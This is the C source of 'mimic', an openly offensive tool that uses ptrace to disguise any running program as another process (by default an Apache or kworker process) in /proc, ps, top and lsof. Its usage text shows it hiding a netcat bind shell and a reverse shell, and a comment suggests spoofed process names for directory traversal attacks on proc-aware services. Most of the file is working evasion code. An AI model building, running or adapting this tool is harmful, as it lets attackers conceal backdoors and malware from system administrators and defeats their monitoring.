
/***********************************************************************************************************************
 *
 *	mimic
 *		Liar, liar, /proc on fire!
 *
 *
 *	emptymonkey's tool for covert execution. 
 *		This tool runs in user-space and requires *no* elevated privileges. 
 *
 *
 *	2014-09-28
 *
 *
 *	This tool allows a user to run any program on the system and have it appear in the process listings as any other
 *	program. This is acheived by altering the internal process structures in a way that confuses it's entry in the
 *	 /proc filesystem. All tools that report process details back to the user (e.g. ps, top, lsof) gather their
 *	information from the /proc filesystem.
 *
 *
 *	Features:
 *		* Mimics the desired process while maintaining a proper internal consistency.
 *			This ensures that the real process isn't confused by it's own camouflage.
 *		* Alter /proc/PID/cmdline to report as the mimic cmdline would.
 *		* Alter /proc/PID/environ to report as the mimic envp would.
 *		* Alter /proc/PID/stat to report as the mimic stat would.
 *
 **********************************************************************************************************************/


#define _GNU_SOURCE


#include <errno.h>
#include <error.h>
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <wordexp.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>


#include "libptrace_do.h"


// These defaults are just processes that look reasonably innocent. Feel free to change them as you see fit.
// Be creative!
#define DEFAULT_MIMIC "/usr/sbin/apache2 -k start"
#define DEFAULT_ROOT_MIMIC "[kworker/0:0]"


// In one case, mimic will want to reset it's own state. This means it will call execve on itself. We will
// use an SOH character in the argv array to mark that it is the second time through, and thus a different
// execution case.
#define SOH_CHAR	0x01
#define NULL_CHAR	0x00


#define PR_SET_MM   35
#define PR_SET_MM_EXE_FILE  13



char **wordexp_t_to_vector(wordexp_t *wordexp_t_in);
int key_match(char **vector, char *key_value);
void build_execution_headers(void *local_buffer, void *base_addr, char **argv, char **envp);
int get_vector_byte_count(char **argv);



char *CALLING_CARD = "@emptymonkey - https://github.com/emptymonkey";



/***********************************************************************************************************************
 *
 * usage()
 *
 *	Inputs:
 *		None.
 *
 *	Outputs:
 *		None.
 *
 *	Purpose:
 *		Advise the user as to the error of their ways.
 *
 **********************************************************************************************************************/
void usage(){

	fprintf(stderr, "\nusage: %s -e COMMAND [-m MIMIC] [-b] [-a KEY=VALUE] [-q] [-h]\n", program_invocation_short_name);
	fprintf(stderr, "\t-e\tExecute COMMAND.\n");
	fprintf(stderr, "\t-m\tSetup COMMAND to look like MIMIC.\n");
	fprintf(stderr, "\t\t\tDefault for non-root is:\t\"%s\"\n", DEFAULT_MIMIC);
	fprintf(stderr, "\t\t\tDefault for root is:\t\t\"%s\"\n", DEFAULT_ROOT_MIMIC);
	fprintf(stderr, "\t-b\tLaunch COMMAND in the background.\n");
	fprintf(stderr, "\t-a\tAdd / overwrite KEY to the mimic environment with associated VALUE.\n");
	fprintf(stderr, "\t-r\tRaw mimic string. Do not process it in the normal way. (Useful for name fuzzing / mangling.)\n");
	fprintf(stderr, "\t-q\tBe quiet! Do not print normal output.\n");
	fprintf(stderr, "\t-h\tPrint this helpful message.\n");
	fprintf(stderr, "\n\tNotes:\n");
	fprintf(stderr, "\t\tThe MIMIC environment will be a copy of the COMMAND environment.\n");
	fprintf(stderr, "\t\tThe '_' variable is automatically changed.\n");
	fprintf(stderr, "\t\tThe -a flag can be called multiple times to add / overwrite multiple variables.\n");
	fprintf(stderr, "\n\tExamples:\n");
	fprintf(stderr, "\t\tmimic -e /bin/bash\n");
	fprintf(stderr, "\t\tset_target_pid 1 && mimic -e /bin/bash\n");
	fprintf(stderr, "\t\tmimic -b -e \"./revsh\"\n");
	fprintf(stderr, "\t\tmimic -b -e \"nc -l -e /bin/bash\"\n");
	fprintf(stderr, "\t\tmimic -b -e \"nc -l -e \\\"mimic -e /bin/bash\\\"\"\n\n");

	exit(-1);
}



/***********************************************************************************************************************
 *
 *	main()
 *
 *
 *	Inputs:
 *		Our instructions from the command line, as well as our environment.
 *
 *	Outputs:
 *		An integer representing status.
 *
 *
 *	Purpose: main() runs the show.
 *
 *
 *	Strategy: This is a simple program. The heavy lifting is done using the ptrace_do library. That, along with a 
 *		solid understanding of process internals, leaves very little left for us to do here. The plan of attack is
 *		as follows:
 *			* Parse the relevant input from the user and do some initialization.
 *			* Fork a child process. (This child will be the exec() point, and is our willing accomplice.)
 *			* The child will request to be ptrace()'d and then proceed to exec() the real binary.
 *			* The parent will connect with the child and initialize its ptrace_do instance.
 *			* The parent will examine the child's state.
 *			* The parent will inject a prctl() PR_SET_NAME request for the child to execute.
 *			* The parent will continue to execute the child, one step at a time, inspecting the child each at step.
 *				It will continue until it is able to locate the child's main() function entry point.
 *			* As the child was executed with the mimic argv and envp, the deception was already set up by the kernel.
 *				We must now set up the child's internal state so it doesn't deceive itself.
 *			* The parent will request a chunk of memory in the child.
 *			* The parent will set up that region of memory to hold the execution headers, as you would normally find at
 *				the base of the stack, consisting of argv, envp, and a NULL auxv.
 *			* The parent will set up some remaining state in the child and detach.
 *			* In the case where the child needs to run in a foreground state, the parent will set up it's own deceptive
 *				mimic argv and envp, then re-exec by calling execve() on itself. It's mimic argv will have a special
 *				character (SOH) set up at at a precise point. This character will be interpreted upon re-execution as a
 *				directive to wait() for child completion.
 *
 *	Good-bye and have a good-luck! :)
 *
 **********************************************************************************************************************/
int main(int argc, char **argv, char **envp){

	unsigned int i, j;
	int retval;

	int opt;

	char *execute_string = NULL, *mimic_string = NULL;
	wordexp_t execute_wordexp_t, mimic_wordexp_t;
	char **execute_argv, **mimic_argv;
	int execute_argc, mimic_argc;
	char **mimic_envp;
	int mimic_envc = 0;
	int raw_mimic = 0;

	int child_pid;
	struct ptrace_do *child;

	char **execution_header_local;
	void *execution_header_remote;

	char *local_buffer;
	void *remote_buffer;

	unsigned int execution_header_size;

	char *tmp_string_ptr;

	unsigned long peektext;

	unsigned long argc_stack_val, argv_stack_val, envp_stack_val;
	int status;
	long ret_long;

	struct user_regs_struct test_regs;

	int background = 0;

	int self_exec = 0;

	int tmp_size;

	char **foreground_mimic_argv;
	char soh_string[2];

	char *mimic_short_name;

	int quiet = 0;


	// Before going forward, we need to figure out if this is the initial launch, or the re-exec we 
	// called on ourselves.
	if(argv){
		i = 0;
		while(argv[i]){
			if(argv[i][0] == SOH_CHAR){
				self_exec = 1;
				argv[i][0] = NULL_CHAR;
				argv[i] = NULL;
				break;
			}
			i++;
		}
	}

	// If it's the re-exec, reset our name to the mimic name, and wait() for the child to complete.
	if(self_exec){
		memset(&argc, i, 1);	
		i++;
		if((retval = prctl(PR_SET_NAME, argv[i], NULL, NULL, NULL)) == -1){
			fprintf(stderr, "prctl(PR_SET_NAME, %lx, NULL, NULL, NULL): %s\n", \
					(unsigned long) argv[i + 1], strerror(errno));
			exit(-1);
		}

		j = 0;
		while(argv[i][j]){
			argv[i][j] = NULL_CHAR;
			j++;
		}

		wait(NULL);
		exit(0);
	}


	// Onward to the normal case of initial execution!


	// The max size needed for the new env buffer will be:
	//  * size of current env
	//  * plus the size of the max '_' variable (which is PATH_MAX + 3)
	//	* plus the strlen's of the various added environment variables.
	//
	// We probably won't need that much, but that should suffice for a max estimate.
	tmp_size = get_vector_byte_count(envp);
	tmp_size += PATH_MAX + 3;

	// Step through the args once just to estimate the incoming size of the new environment variables.
	opterr = 0;
	while ((opt = getopt(argc, argv, "e:m:wa:bqh")) != -1) {
		switch (opt) {
			case 'a':
				tmp_size += strlen(optarg) + 1;
		}
	}

	if((mimic_envp = (char **) calloc(tmp_size, sizeof(char))) == NULL){
		fprintf(stderr, "calloc(%d, %d): %s\n", tmp_size, (int) sizeof(char), strerror(errno));
		exit(-1);
	}


	// Now reset the getopt() loop and actually handle the options.
	optind = 1;
	opterr = 1;
	while ((opt = getopt(argc, argv, "e:m:wa:brqh")) != -1) {

		switch (opt) {
			case 'e':
				execute_string = optarg;
				break;

			case 'm':
				mimic_string = optarg;
				break;

			case 'b':
				background = 1;
				break;

			case 'a':
				if(!key_match(mimic_envp, optarg)){
					mimic_envp[mimic_envc++] = optarg;
				}
				break;

			case 'r':
				raw_mimic = 1;
				break;

			case 'q':
				quiet = 1;
				break;

			case 'h':
			default:
				usage();
		}
	}

	if((argc - optind) || !execute_string){
		usage();
	}


	// Do initialization of basic data structures for the given input.

	if(!mimic_string){
		if(!getuid()){
			mimic_string = DEFAULT_ROOT_MIMIC;
		}else{
			mimic_string = DEFAULT_MIMIC;
		}
	}

	if(wordexp(execute_string, &execute_wordexp_t, 0)){
		error(-1, errno, "wordexp(%s, %lx, 0)", execute_string, (unsigned long) &execute_wordexp_t);
	}

	if((execute_argv = wordexp_t_to_vector(&execute_wordexp_t)) == NULL){
		error(-1, errno, "wordexp_t_to_vector(%lx)", (unsigned long) &execute_wordexp_t);
	}
	execute_argc = execute_wordexp_t.we_wordc;

	/*
		 Occasionally you'll want to ensure that mimic is just an unparsed raw string. Thi is useful
		 when performing a directory traversal or file overwrite attack against a proc aware service.
		 E.g. mimic_string: "../../.."
	*/
	if(raw_mimic){
		if((mimic_argv = calloc(2, sizeof(char *))) == NULL){
			error(-1, errno, "calloc(2, %d)", (int) sizeof(char *));
		}

		tmp_size = strlen(mimic_string);
		if((mimic_argv[0] = calloc(tmp_size + 1, sizeof(char))) == NULL){
			error(-1, errno, "calloc(%d, %d)", tmp_size + 1, (int) sizeof(char));
		}
		memcpy(mimic_argv[0], mimic_string, tmp_size);
		mimic_argc = 1;

	}else{
	
		if(wordexp(mimic_string, &mimic_wordexp_t, 0)){
			error(-1, errno, "wordexp(%s, %lx, 0)", mimic_string, (unsigned long) &mimic_wordexp_t);
		}

		if((mimic_argv = wordexp_t_to_vector(&mimic_wordexp_t)) == NULL){
			error(-1, errno, "wordexp_t_to_vector(%lx)", (unsigned long) &mimic_wordexp_t);
		}
		mimic_argc = mimic_wordexp_t.we_wordc;
	}

	// Grab the mimic short name, which is needed for proper reporting in /proc/PID/stat .
	if(raw_mimic){
		tmp_size = strlen(mimic_argv[0]);
		if((mimic_short_name = (char *) calloc(tmp_size + 1, sizeof(char))) == NULL){
			error(-1, errno, "calloc(%d, %d)", tmp_size + 1, (int) sizeof(char));
		}
		memcpy(mimic_short_name, mimic_argv[0], tmp_size);
	}else{
		if((mimic_argv[0][0] == '[') && (mimic_argv[0][strlen(mimic_argv[0]) - 1] == ']')){
			if((mimic_short_name = (char *) calloc(strlen(mimic_argv[0]) - 2 + 1, sizeof(char))) == NULL){
				error(-1, errno, "calloc(%d, %d)", (int) (strlen(mimic_argv[0]) - 2 + 1), (int) sizeof(char));
			}
			memcpy(mimic_short_name, mimic_argv[0] + 1, strlen(mimic_argv[0]) - 2);
		}else{
			if((mimic_short_name = strrchr(mimic_argv[0], '/')) == NULL){
				mimic_short_name = mimic_argv[0];
			}else{
				mimic_short_name++;
			}
		}
	}

	// Fix the '_=' environment variable. There are probably others you should do manually,
	// but we'll do this one automatically at least.
	if(envp){
		i = 0;
		while(envp[i]){
			if(!key_match(mimic_envp, envp[i])){
				if(!strncmp(envp[i], "_=", 2)){
					tmp_string_ptr = (char *) calloc(strlen(mimic_argv[0]) + 3, sizeof(char));
					tmp_string_ptr[0] = '_';
					tmp_string_ptr[1] = '=';
					memcpy(tmp_string_ptr + 2, mimic_argv[0], strlen(mimic_argv[0]));
					mimic_envp[mimic_envc++] = tmp_string_ptr;

				}else{
					mimic_envp[mimic_envc++] = envp[i];
				}
			}
			i++;
		}
	}

	// Fork off the child.

	if(!quiet){
		printf("Launching child...");
		fflush(stdout);
	}


	retval = fork();


	if(retval == -1){
		error(-1, errno, "fork()");

	}else if(!retval){

		// Child.

		// Request to be attached.
		if((retval = ptrace(PTRACE_TRACEME, 0, NULL, NULL)) == -1){
			error(-1, errno, "ptrace(PTRACE_TRACEME, 0, NULL, NULL)");
		}

		// Go, go, go!
		execve(execute_argv[0], mimic_argv, mimic_envp);
		error(-1, errno, "execve(%s, %lx, NULL)", execute_argv[0], (unsigned long) mimic_argv);

	}else{

		// Parent
		//	(Due to the verbose printf() statements, this section will be lightly commented.)

		child_pid = retval;

		if(!quiet){
			printf("\t\t\tSuccess!\n");
		}

		if(!quiet){
			printf("Waiting for child to attach...");
			fflush(stdout);
		}

		wait(NULL);

		if(!quiet){
			printf("\t\tSuccess!\n");
		}


		if(!quiet){
			printf("Initializing ptrace_do...");
			fflush(stdout);
		}
		if((child = ptrace_do_init(child_pid)) == NULL){
			fprintf(stderr, "ptrace_do_init(%d): %s\n", child_pid, strerror(errno));
			exit(-1);
		}
		if(!quiet){
			printf("\t\tSuccess!\n");
		}


		if(!quiet){
			printf("Determining stack state...");
			fflush(stdout);
		}
		errno = 0;
		peektext = ptrace(PTRACE_PEEKTEXT, child->pid, child->saved_regs.rsp, NULL);
		if(errno){
			fprintf(stderr, "ptrace(PTRACE_PEEKTEXT, %d, %lx, NULL): %s\n", \
					child->pid, (unsigned long) child->saved_regs.rsp, \
					strerror(errno));
			goto CLEAN_UP;
		}
		argc_stack_val = peektext;
		argv_stack_val = child->saved_regs.rsp + 0x8;
		envp_stack_val = argv_stack_val + ((argc_stack_val + 1) * 0x8);

		if(!quiet){
			printf("\t\tSuccess!\n");
		}


		if(!quiet){
			printf("Politely requesting name change...");
			fflush(stdout);
		}
		if((local_buffer = ptrace_do_malloc(child, strlen(mimic_short_name) + 1)) == NULL){
			fprintf(stderr, "ptrace_do_malloc(%lx, %d): %s\n", \
					(unsigned long) child, (int) (strlen(mimic_short_name) + 1), \
					strerror(errno));
			goto CLEAN_UP;
		}

		memset(local_buffer, 0, strlen(mimic_short_name) + 1);
		memcpy(local_buffer, mimic_short_name, strlen(mimic_short_name));

		if((remote_buffer = ptrace_do_push_mem(child, local_buffer)) == 0){
			fprintf(stderr, "ptrace_do_push_mem(%lx, %lx): %s\n", \
					(unsigned long) child, (unsigned long) local_buffer, \
					strerror(errno));
			goto CLEAN_UP;
		}

		errno = 0;
		ret_long = ptrace_do_syscall(child, __NR_prctl, PR_SET_NAME, (unsigned long) remote_buffer, 0, 0, 0, 0);
		if(errno){
			fprintf(stderr, "ptrace_do_syscall(%lx, __NR_prctl, PR_SET_NAME, %lx, 0, 0, 0, 0): %s\n", \
					(unsigned long) child, (unsigned long) remote_buffer, \
					strerror(errno));
			goto CLEAN_UP;
		}
		if(ret_long < 0){
			fprintf(stderr, "remote prctl(PR_SET_NAME, %lx, 0, 0, 0): %s\n", \
					(unsigned long) child->saved_regs.rsp + 0x8, \
					strerror(-ret_long));
			goto CLEAN_UP;
		}
		if(!quiet){
			printf("\tSuccess!\n");
		}


		if(!quiet){
			printf("Searching for main()...");
			fflush(stdout);
		}
		memcpy(&test_regs, &(child->saved_regs), sizeof(struct user_regs_struct));

		// This while loop test represents the state of the registers upon entry into the main() function 
		// after a proper libc initialization. This is the heuristic we will use to determine if we are in
		// the proper place to work our mimic magic! 

		// Note: removed the check for $rcx here because on some platforms libc hasn't cleared it out. 
		while( ! \
				( \
					(test_regs.rdi == argc_stack_val) && \
					(test_regs.rsi == argv_stack_val) && \
					(test_regs.rdx == envp_stack_val) && \
					(test_regs.rip > child->map_head->start_address) && \
					(test_regs.rip <  child->map_head->end_address) && \
					(test_regs.rax == test_regs.rip)
/*
					((test_regs.rbp == 0) || (test_regs.rbp == 0x6b4170)) \
*/
				)){

			if((ret_long = ptrace(PTRACE_SINGLESTEP, child->pid, NULL, NULL)) == -1){
				fprintf(stderr, "ptrace(PTRACE_SINGLESTEP, %d, NULL, NULL): %s\n", \
						child->pid, \
						strerror(errno));
				break;
			}

			wait(&status);
			if(!WIFSTOPPED(status)){
				fprintf(stderr, "!WIFSTOPPED()\n");
				ret_long = -1;
				break;
			}

			if((ret_long = ptrace(PTRACE_GETREGS, child->pid, NULL, &test_regs)) == -1){
				fprintf(stderr, "ptrace(PTRACE_GETREGS, %d, NULL, %lx): %s\n", \
						child->pid, (unsigned long) &test_regs, \
						strerror(errno));
				break;
			}
		}

		if(ret_long == -1){
			fprintf(stderr, "Error: libc register setup not detected. Aborting!\n");
			goto CLEAN_UP;
		}
		if(!quiet){
			printf("\t\t\tSuccess!\n");
		}


		// We use the term "execution headers" to refer to the solid chunk of memory that contains
		// argc, argv, envp, and auxv.
		// Once it has been set up, the pointers inside will be consistantly self-referential, for
		// the address space of the child process. That will allow us to simply push the memory 
		// chunk over and detatch.
		if(!quiet){
			printf("Building execution headers...");
			fflush(stdout);
		}
		memcpy(&(child->saved_regs), &test_regs, sizeof(struct user_regs_struct));

		execution_header_size = get_vector_byte_count(argv);
		execution_header_size += get_vector_byte_count(envp);
		execution_header_size += 2 * sizeof(unsigned long);

		if((execution_header_local = (char **) ptrace_do_malloc(child, execution_header_size)) == NULL){
			fprintf(stderr, "ptrace_do_malloc(%lx, %d): %s\n", \
					(unsigned long) child, (int) ((execute_argc * sizeof(char **)) + 1), \
					strerror(errno));
			goto CLEAN_UP;
		}
		memset(execution_header_local, 0, execution_header_size);

		if((execution_header_remote = ptrace_do_get_remote_addr(child, (void *) execution_header_local)) == NULL){
			fprintf(stderr, "ptrace_do_get_remote_addr(%lx, %lx): %s\n", \
					(unsigned long) child, (unsigned long) execution_header_local, \
					strerror(errno));
			goto CLEAN_UP;
		}

		build_execution_headers(execution_header_local, execution_header_remote, execute_argv, envp);

		if((execution_header_remote = ptrace_do_push_mem(child, execution_header_local)) == 0){
			fprintf(stderr, "ptrace_do_push_mem(%lx, %lx): %s\n", \
					(unsigned long) child, (unsigned long) execution_header_remote, \
					strerror(errno));
			goto CLEAN_UP;
		}

		ptrace_do_free(child, execution_header_local, FREE_LOCAL);
		if(!quiet){
			printf("\t\tSuccess!\n");
		}


		if(!quiet){
			printf("Setting up final state...");
			fflush(stdout);
		}
		child->saved_regs.rdi = execute_argc;
		child->saved_regs.rsi = (unsigned long) execution_header_remote;
		child->saved_regs.rdx = (unsigned long) execution_header_remote + ((execute_argc + 1) * sizeof(char **));
		if(!quiet){
			printf("\t\tSuccess!\n");
		}

		if(!quiet){
			printf("\n\tGood-bye and have a good luck! :)\n\n");
		}


CLEAN_UP:
		ptrace_do_cleanup(child);


		// Handle the case where we need to hang around and reserve the foreground slot for the child.
		if(!background){

			soh_string[0] = SOH_CHAR;
			soh_string[1] = NULL_CHAR;

			// mimic_argc + slot for the SOH string + slot for the mimic short name string + slot for NULL termination
			//  -> mimic_argc + 3
			if((foreground_mimic_argv = (char **) calloc(mimic_argc + 3, sizeof(char **))) == NULL){
				fprintf(stderr, "calloc(%d, %d): %s\n", \
						tmp_size, (int) sizeof(char), strerror(errno));
				exit(-1);
			}

			i = 0;
			while(mimic_argv[i]){
				foreground_mimic_argv[i] = mimic_argv[i];
				i++;
			}
			foreground_mimic_argv[i++] = soh_string;
			foreground_mimic_argv[i] = mimic_short_name;

			execve(argv[0], foreground_mimic_argv, mimic_envp);
		}

		return(0);
	}

	return(-1);
}



/***********************************************************************************************************************
 *
 *	key_match()
 *
 *		Inputs:
 *			A vector of ENV style strings.
 *			A key value to search for.
 *
 *		Outputs:
 *			An int representing success or failure.
 *
 *		Purpose:
 *			Tell the caller whether or not the key has a match in the vector.
 *
 **********************************************************************************************************************/
int key_match(char **vector, char *key_value){

	int i;
	char *ptr;

	i = 0;
	while(vector[i]){

		if((ptr = strchr(key_value, '=')) != NULL){
			if(!strncmp(vector[i], key_value, (int) (ptr - key_value) + 1)){
				return(1);
			}
		}

		i++;
	}

	return(0);
}



/***********************************************************************************************************************
 *
 *	build_execution_headers()
 *
 *		Inputs:
 *			A buffer to store results in.
 *			The base address the remote memory chunk will have.
 *			argv and envp
 *
 *		Outputs:
 *			None.
 *
 *		Purpose:
 *			Builds the execution headers. Given that this is only called once, I don't suppose it needs to be a function,
 *			but moving it here keeps the above flow a bit cleaner.
 *
 **********************************************************************************************************************/
void build_execution_headers(void *local_buffer, void *base_addr, char **argv, char **envp){

	int i;
	int argc, envc;
	char **pointer_ptr;
	char *tmp_ptr_remote;
	char *tmp_ptr_local;
	int tmp_len;


	argc = 0;
	if(argv){
		while(argv[argc++]){}
	}

	envc = 0;
	if(envp){
		while(envp[envc++]){}
	}

	tmp_len = (argc * sizeof(char *)) + (envc * sizeof(char *)) + (2 * sizeof(char *));

	pointer_ptr = (char **) local_buffer;
	tmp_ptr_local = local_buffer + tmp_len;
	tmp_ptr_remote = base_addr + tmp_len;


	if(argv){	
		i = 0;
		while(argv[i]){
			*(pointer_ptr++) = tmp_ptr_remote;
			tmp_len = strlen(argv[i]);
			memcpy(tmp_ptr_local, argv[i], tmp_len);
			tmp_ptr_local += tmp_len + 1;
			tmp_ptr_remote += tmp_len + 1;

			i++;
		}

		pointer_ptr++;
	}	

	if(envp){	
		i = 0;
		while(envp[i]){
			*(pointer_ptr++) = tmp_ptr_remote;
			tmp_len = strlen(envp[i]);
			memcpy(tmp_ptr_local, envp[i], tmp_len);
			tmp_ptr_local += tmp_len + 1;
			tmp_ptr_remote += tmp_len + 1;

			i++;
		}
	}	
}



/***********************************************************************************************************************
 *
 *	get_vector_byte_count()
 *
 *		Inputs:
 *			A pointer to a vector.
 *
 *		Outputs:
 *			The number of bytes used by the vector.
 *
 *		Purpose:
 *			Find the amount of bytes in use by a vector.
 *
 **********************************************************************************************************************/
int get_vector_byte_count(char **argv){

	int i = 0;
	int total_strlen = 0;

	while(argv[i]){
		total_strlen += strlen(argv[i]);
		i++;
	}

	return( ((i + 1) * sizeof(void *)) + total_strlen + (i * sizeof(char)) );
}
